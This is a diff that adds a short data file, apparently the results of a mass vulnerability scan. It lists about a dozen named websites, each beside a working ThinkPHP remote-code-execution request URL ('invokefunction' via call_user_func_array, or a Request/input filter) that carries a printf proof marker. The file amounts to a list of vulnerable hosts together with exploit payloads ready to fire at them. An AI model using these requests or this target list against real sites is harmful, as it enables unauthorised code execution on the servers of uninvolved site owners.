@@ -1,0 +1,13 @@
+baohiemlibertyvn.com	invokefunction	http://baohiemlibertyvn.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+huertasconsulting.com	invokefunction	https://huertasconsulting.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+inyalearning.com	invokefunction	http://inyalearning.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+mail.cagdasspormerkezi.com	invokefunction	https://mail.cagdasyazilim.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+minorityhealthstl.org	invokefunction	https://minorityhealthstl.org/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+mail.roycerolls.net	invokefunction	https://mail.roycerolls.net/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+pharmatraders.com	invokefunction	https://pharmatraders.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+shawneecycle.com	invokefunction	https://shawneecycle.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+www.baohiemlibertyvn.com	invokefunction	http://www.baohiemlibertyvn.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+www.magicalshoes24.com	invokefunction	https://magicalshoes24.com/en/?s=%2Findex%2F%5Cthink%5Capp%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=printf&vars%5B1%5D%5B0%5D=%25stprce_mark_8842&SubmitCurrency=1&id_currency=2
+yepom.com	input-filter	https://shop119849753.world.taobao.com/index.php?s=index/\think\Request/input&filter[]=printf&data=tprce_mark_8842
+korfunet.com	invokefunction	https://korfunet.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+occhialevintage.com	invokefunction	https://occhialevintage.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
